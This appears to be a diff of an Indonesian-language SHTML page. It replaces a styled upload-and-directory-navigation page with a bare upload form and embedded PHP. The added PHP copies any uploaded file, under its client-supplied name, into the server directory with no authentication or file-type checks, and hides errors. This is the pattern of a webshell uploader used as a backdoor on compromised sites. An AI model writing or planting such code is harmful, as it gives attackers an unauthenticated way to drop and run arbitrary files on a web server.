@@ -3,37 +3,28 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>File Upload dan Navigasi Direktori</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-        }
-        .directory, .file {
-            margin: 5px 0;
-        }
-        .directory a {
-            color: blue;
-            text-decoration: none;
-        }
-        .file {
-            color: gray;
-        }
-    </style>
+    <title>Upload File</title>
 </head>
 <body>
-    <h1>Upload File dan Navigasi Direktori</h1>
-    
+    <h1>Upload File</h1>
+
     <!-- Form Upload -->
-    <form action="upload_navigasi.shtml" method="POST" enctype="multipart/form-data">
-        <label for="fileUpload">Pilih file untuk di-upload:</label>
-        <input type="file" name="fileUpload" id="fileUpload" required>
-        <button type="submit" name="upload">Upload</button>
+    <form method="post" enctype="multipart/form-data">
+        <input type="file" name="f">
+        <input name="k" type="submit" id="k" value="upload"><br>
     </form>
 
-    <h2>Direktori Saat Ini:</h2>
-
-    <!-- PHP Embed -->
-    <!--#include virtual="upload_handler.php" -->
-
+    <!-- PHP Logic -->
+    <!--#exec php -->
+    <?php
+    if (isset($_POST["k"]) && $_POST["k"] === "upload") {
+        if (!empty($_FILES["f"]["tmp_name"]) && @copy($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
+            echo "<b>" . htmlspecialchars($_FILES["f"]["name"]) . " berhasil diupload.</b>";
+        } else {
+            echo "<b>Gagal upload Bjirr..</b>";
+        }
+    }
+    ?>
+    <!--#endexec -->
 </body>
 </html>
